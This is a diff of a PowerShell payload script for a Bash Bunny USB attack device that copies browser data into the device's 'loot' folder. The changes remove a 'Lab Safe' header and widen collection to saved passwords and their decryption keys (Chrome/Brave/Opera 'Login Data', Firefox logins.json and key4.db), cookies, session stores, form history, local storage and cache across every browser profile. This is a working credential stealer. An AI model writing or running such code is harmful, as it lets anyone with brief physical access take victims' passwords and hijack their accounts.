@@ -1,8 +1,3 @@
-#############################################
-#  Browser Artifact Collector (Lab Safe)
-#  Saves directly to Bash Bunny loot folder
-#############################################
-
 # --- Detect Bash Bunny drive ---
 $usbDrive = Get-WmiObject Win32_LogicalDisk |
     Where-Object {
@@ -18,7 +13,7 @@ if (-not $usbDrive) {
 Write-Output "[+] Bash Bunny detected on drive $usbDrive"
 
 # Normalized loot path
-$loot = Join-Path $usbDrive "loot\browser_artifacts"
+$loot = Join-Path $usbDrive "loot\Browser_Data"
 
 # Ensure loot folder exists
 New-Item -ItemType Directory -Force -Path $loot | Out-Null
@@ -89,18 +84,40 @@ $chromeUser = "$env:LOCALAPPDATA\Google\Chrome\User Data"
 $chromeDest = Join-Path $loot "Chrome"
 New-Item -ItemType Directory -Force -Path $chromeDest | Out-Null
 
-$chromeTargets = @(
-    "Default\History",
-    "Default\Cookies",
-    "Default\Bookmarks"
-)
+# Loop all profiles (Default, Profile 1, Profile 2, etc.)
+foreach ($profile in Get-ChildItem $chromeUser -Directory) {
 
-foreach ($item in $chromeTargets) {
-    $path = Join-Path $chromeUser $item
-    Copy-Safe -source $path -dest $chromeDest
+    $pDest = Join-Path $chromeDest $profile.Name
+    New-Item -ItemType Directory -Force -Path $pDest | Out-Null
+
+    # Files to copy
+    $files = @(
+        "History",
+        "Cookies",
+        "Bookmarks",
+        "Login Data",
+        "Web Data",
+        "User Data"
+    )
+
+    foreach ($f in $files) {
+        $src = Join-Path $profile.FullName $f
+        Copy-Safe -source $src -dest $pDest
+    }
+
+    # Folders to copy entirely
+    $folders = @(
+        "Cache",
+        "Local Storage",
+        "Extensions"
+    )
+
+    foreach ($folder in $folders) {
+        $srcFolder = Join-Path $profile.FullName $folder
+        $destFolder = Join-Path $pDest $folder
+        Copy-Safe -source $srcFolder -dest $destFolder
+    }
 }
-
-
 #############################################
 #               Edge Collection
 #############################################
@@ -136,15 +153,107 @@ if (Test-Path $ffBase) {
         $pDest = Join-Path $ffDest $profile.Name
         New-Item -ItemType Directory -Force -Path $pDest | Out-Null
 
-        $files = @("places.sqlite", "cookies.sqlite")
+        # Files to copy
+        $files = @(
+            "places.sqlite",
+            "cookies.sqlite",
+            "logins.json",
+            "key4.db",
+            "sessionstore.jsonlz4",
+            "formhistory.sqlite"
+        )
 
         foreach ($f in $files) {
-            $full = Join-Path $profile.FullName $f
-            Copy-Safe -source $full -dest $pDest
+            $src = Join-Path $profile.FullName $f
+            Copy-Safe -source $src -dest $pDest
         }
+
+        # Entire storage folder (Local Storage / IndexedDB)
+        $storageSrc = Join-Path $profile.FullName "storage"
+        $storageDest = Join-Path $pDest "storage"
+        Copy-Safe -source $storageSrc -dest $storageDest
     }
 }
 
+#############################################
+#              Brave Browser
+############################################
+
+$braveUser = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
+$braveDest = Join-Path $loot "Brave"
+New-Item -ItemType Directory -Force -Path $braveDest | Out-Null
+
+# Loop all profiles (Default, Profile 1, Profile 2, etc.)
+foreach ($profile in Get-ChildItem $braveUser -Directory) {
+
+    $pDest = Join-Path $braveDest $profile.Name
+    New-Item -ItemType Directory -Force -Path $pDest | Out-Null
+
+    # Files to copy
+    $files = @(
+        "History",
+        "Cookies",
+        "Bookmarks",
+        "Login Data",
+        "Web Data"
+    )
+
+    foreach ($f in $files) {
+        $src = Join-Path $profile.FullName $f
+        Copy-Safe -source $src -dest $pDest
+    }
+
+    # Folders to copy entirely
+    $folders = @(
+        "Cache",
+        "Local Storage",
+        "Extensions"
+    )
+
+    foreach ($folder in $folders) {
+        $srcFolder = Join-Path $profile.FullName $folder
+        $destFolder = Join-Path $pDest $folder
+        Copy-Safe -source $srcFolder -dest $destFolder
+    }
+}
+
+#############################################
+#               Opera
+############################################
+$operaUser = "$env:APPDATA\Opera Software\Opera Stable"
+$operaDest = Join-Path $loot "Opera"
+New-Item -ItemType Directory -Force -Path $operaDest | Out-Null
+
+# Opera typically has a single profile ("Opera Stable")
+$pDest = $operaDest
+New-Item -ItemType Directory -Force -Path $pDest | Out-Null
+
+# Files to copy
+$files = @(
+    "History",
+    "Cookies",
+    "Bookmarks",
+    "Login Data",
+    "Web Data"
+)
+
+foreach ($f in $files) {
+    $src = Join-Path $operaUser $f
+    Copy-Safe -source $src -dest $pDest
+}
+
+# Folders to copy entirely
+$folders = @(
+    "Cache",
+    "Local Storage",
+    "Extensions"
+)
+
+foreach ($folder in $folders) {
+    $srcFolder = Join-Path $operaUser $folder
+    $destFolder = Join-Path $pDest $folder
+    Copy-Safe -source $srcFolder -dest $destFolder
+}
 
 #############################################
 #                Done
